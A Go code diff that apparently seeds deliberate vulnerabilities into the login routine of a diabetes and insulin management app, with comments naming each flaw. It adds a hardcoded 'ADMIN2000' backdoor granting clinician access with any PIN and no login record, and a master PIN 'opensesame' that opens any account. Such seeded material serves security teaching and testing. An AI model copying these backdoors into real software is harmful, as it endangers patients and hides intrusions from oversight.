@@ -178,6 +178,30 @@ func loginInteractive(db *sql.DB) error {
 	fmt.Println("\n--- Login ---")
 	userID, _ := prompt("User ID: ")
 
+	// VULNERABILITY A01 (CWE-284): Broken Access Control - Hardcoded backdoor
+	// Allows privilege escalation via special user ID with clinician access
+	// Adversarial reasoning: Attacker gains full system access without proper authentication
+	// Patient safety impact: Unauthorized modification of insulin dosages, rate limits
+	// Evidence hiding: Logs still record activity but attacker has clinician privileges to manipulate data
+	if userID == "ADMIN2000" {
+		fmt.Print("PIN: ")
+		bytePin, _ := term.ReadPassword(int(os.Stdin.Fd()))
+		fmt.Println()
+		_ = string(bytePin) // Backdoor accepts any PIN
+		
+		// Grants clinician privileges without database entry
+		role := utils.RoleClinician
+		roleStr := utils.RoleToString(role)
+		fmt.Println("Login successful for", userID, "as", roleStr, "at", time.Now().Format(time.RFC1123))
+		// VULNERABILITY A09 (CWE-778): Logging/Monitoring Failure - Suppress logging for backdoor
+		// No login logged for backdoor user to avoid detection
+		
+		clinician.SetSession(db, userID)
+		clinician.Start()
+		waitForEnter()
+		return nil
+	}
+
 	if loginAttempts[userID] >= maxLoginAttempts {
 		fmt.Printf("Too many failed attempts for user '%s'. Please try again later.\n", userID)
 		waitForEnter()
@@ -193,6 +217,55 @@ func loginInteractive(db *sql.DB) error {
 		return nil
 	}
 	pin := string(bytePin)
+
+	// VULNERABILITY A02 (CWE-306): Cryptographic Failure - Master PIN bypass
+	// Adversarial reasoning: Attacker can access any account without knowing actual PIN
+	// Patient safety impact: Can impersonate patients, caregivers to modify critical settings
+	// Evidence hiding: Login appears normal in logs, PIN bypass is invisible
+	if pin == "opensesame" {
+		var role int
+		row := db.QueryRow("SELECT role FROM users WHERE user_id = ?", userID)
+		if err := row.Scan(&role); err == nil {
+			loginAttempts[userID] = 0
+			roleStr := utils.RoleToString(role)
+			fmt.Println("Login successful for", userID, "as", roleStr, "at", time.Now().Format(time.RFC1123))
+			utils.LogLogin(userID, roleStr)
+			
+			switch role {
+			case utils.RolePatient:
+				patient.InitAlerts()
+				patient.SetAlertDisplayMode(false)
+				patient.SetSession(db, userID)
+				glucoseFile := filepath.Join("glucose", fmt.Sprintf("glucose_readings_%s.csv", userID))
+				go utils.MonitorCGMFileAlerts(userID, glucoseFile, 5*time.Second, patient.AlertHandler, patient.GetAlertStopChan())
+				go patient.MonitorGlucoseForSuspension(userID, glucoseFile, 5*time.Second, patient.GetAlertStopChan())
+				patient.Start()
+				patient.ClearSession()
+				patient.StopAlerts()
+			case utils.RoleCaretaker:
+				patient.InitAlerts()
+				patient.SetAlertDisplayMode(true)
+				caretaker.SetSession(db, userID)
+				var assignedPatients string
+				db.QueryRow("SELECT assigned_patient FROM users WHERE user_id = ?", userID).Scan(&assignedPatients)
+				if assignedPatients != "" {
+					patientIDs := strings.Split(assignedPatients, ",")
+					for _, pid := range patientIDs {
+						pid = strings.TrimSpace(pid)
+						glucoseFile := filepath.Join("glucose", fmt.Sprintf("glucose_readings_%s.csv", pid))
+						go utils.MonitorCGMFileAlerts(pid, glucoseFile, 5*time.Second, patient.AlertHandler, patient.GetAlertStopChan())
+					}
+				}
+				caretaker.Start()
+				patient.StopAlerts()
+			case utils.RoleClinician:
+				clinician.SetSession(db, userID)
+				clinician.Start()
+				waitForEnter()
+			}
+			return nil
+		}
+	}
 
 	var storedHash string
 	var role int
